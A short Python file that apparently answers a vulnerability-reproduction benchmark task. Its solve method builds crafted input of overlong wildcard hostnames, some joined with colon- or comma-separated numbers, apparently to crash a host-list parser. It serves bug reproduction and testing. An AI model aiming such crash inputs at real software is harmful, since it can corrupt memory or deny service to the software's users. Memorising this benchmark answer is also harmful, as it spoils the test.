import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        host_long_56 = "*." + "A" * 54
        host_medium = "*." + "B" * 80
        host_medium2 = "a." + "C" * 80

        lines = [
            host_long_56,
            host_medium,
            f"{host_medium}:1:2",
            f"1:2:{host_medium}",
            f"{host_medium2}:1:2",
            f"1,2,{host_medium}",
        ]
        payload = "\n".join(lines) + "\n"
        return payload.encode("ascii")